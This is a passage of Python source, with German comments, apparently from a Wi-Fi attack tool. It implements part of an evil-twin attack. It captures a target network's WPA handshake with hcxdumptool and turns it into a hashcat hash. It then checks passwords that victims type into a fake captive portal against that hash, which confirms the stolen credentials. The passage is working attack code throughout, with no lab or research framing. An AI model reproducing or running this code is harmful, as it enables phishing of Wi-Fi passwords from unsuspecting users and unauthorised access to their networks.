    # ── v10.7b: Handshake-Capture ────────────────────────────────
    def _start_handshake_capture(self) -> None:
        """Startet hcxdumptool im Hintergrund gegen das Ziel."""
        if not self.config.handshake_capture:
            return
        if not self.config.iface_deauth:
            self._on_log("Handshake-Capture: kein iface_deauth", "WARN")
            return
        if shutil.which("hcxdumptool") is None:
            self._on_log("hcxdumptool fehlt — Capture uebersprungen", "WARN")
            return

        cap_dir = (
            Path(self.config.handshake_file).parent
            if self.config.handshake_file
            else (Path.home() / ".wlan_ultimate" / "captures")
        )
        try:
            cap_dir.mkdir(parents=True, exist_ok=True)
        except (OSError, PermissionError):
            cap_dir = Path("/tmp/wlan_captures")
            cap_dir.mkdir(parents=True, exist_ok=True)

        self._handshake_cap = cap_dir / (
            "evil_twin_"
            + self.config.target_bssid.replace(":", "")
            + "_"
            + datetime.now().strftime("%Y%m%d_%H%M%S")
            + ".pcapng"
        )
        iface = self.config.iface_deauth

        def _loop():
            try:
                # v37-R34 P15d: hcxdumptool 7.x (--rds, -c ohne 'a')
                cmd = [
                    "hcxdumptool",
                    "-i",
                    iface,
                    "-w",
                    str(self._handshake_cap),
                    "-c",
                    str(self.config.target_channel),
                    "--rds=1",
                ]
                self._handshake_proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self._on_log(
                    "Handshake-Capture gestartet → " + self._handshake_cap.name, "OK"
                )
                end = time.time() + max(30, self.config.handshake_timeout)
                while not self._deauth_stop.wait(1.0):
                    if time.time() >= end:
                        break
                    if self._handshake_proc.poll() is not None:
                        break
                try:
                    self._handshake_proc.terminate()
                    self._handshake_proc.wait(timeout=3)
                except (OSError, subprocess.TimeoutExpired):
                    try:
                        self._handshake_proc.kill()
                    except OSError:
                        pass
                self._handshake_proc = None
                self._on_log("Handshake-Capture beendet", "INFO")
                self._extract_handshake_hash()
            except (FileNotFoundError, OSError, RuntimeError) as exc:
                self._on_log("Handshake-Capture: " + str(exc), "ERR")

        self._handshake_proc = None
        threading.Thread(target=_thread_wrap(_loop, "EvilTwinHandshake"), daemon=True, name="EvilTwinHandshake").start()

    def _extract_handshake_hash(self) -> None:
        """Konvertiert .pcapng in .22000 fuer hashcat."""
        cap = getattr(self, "_handshake_cap", None)
        if cap is None or not cap.exists():
            return
        if shutil.which("hcxpcapngtool") is None:
            return
        hash_file = cap.with_suffix(".22000")
        try:
            _ = subprocess.run(
                ["hcxpcapngtool", "-o", str(hash_file), str(cap)],
                capture_output=True,
                text=True,
                timeout=30,
                check=False,
            )
            if hash_file.exists() and hash_file.stat().st_size > 0:
                self._handshake_hash = hash_file
                self._on_log("Hash extrahiert: " + hash_file.name, "OK")
            else:
                self._on_log("Kein Handshake im Capture gefunden", "WARN")
        except (OSError, subprocess.SubprocessError):
            pass

    # ── v10.7b: Passwort-Verifikation ────────────────────────────
    def _verify_portal_password(self, ip: str, password: str) -> bool:
        """v10.8: Adapter fuer CaptivePortalServer.verify_cb.

        Portal-Callback liefert (ip, password). Die interne
        Verifikation braucht nur das Passwort. IP wird geloggt.
        """
        try:
            self._on_log(
                "Verifiziere Passwort fuer " + str(ip), "INFO"
            )
        except (AttributeError, TypeError):
            pass
        try:
            return bool(self.verify_captured_password(password))
        except (AttributeError, TypeError, RuntimeError):
            return False

    def verify_captured_password(self, password: str) -> bool:
        """Prueft ein Portal-Passwort gegen den echten Handshake.

        Wird nach jedem POST mit Passwort aufgerufen. Returned True
        wenn das Passwort gueltig ist. Nutzt hashcat.
        """
        if not self.config.verify_password:
            return True
        if shutil.which("hashcat") is None:
            return False
        hash_file = getattr(self, "_handshake_hash", None)
        if hash_file is None or not hash_file.exists():
            return False

        # Einzelpasswort in temp-Datei
        try:
            pw_file = self._temp_dir / "pw.txt"
            pw_file.write_text(str(password) + "\n", encoding="utf-8")
        except (OSError, AttributeError):
            return False

        out_file = self._temp_dir / "hashcat_out.txt"
        try:
            _ = subprocess.run(
                [
                    "hashcat",
                    "-m",
                    "22000",
                    "-a",
                    "0",
                    "--force",
                    "--quiet",
                    "--potfile-disable",
                    "--outfile-format=2",
                    "-o",
                    str(out_file),
                    str(hash_file),
                    str(pw_file),
                ],
                capture_output=True,
                text=True,
                timeout=30,
                check=False,
            )
            if out_file.exists() and out_file.stat().st_size > 0:
                return True
        except (OSError, subprocess.SubprocessError):
            pass
        return False


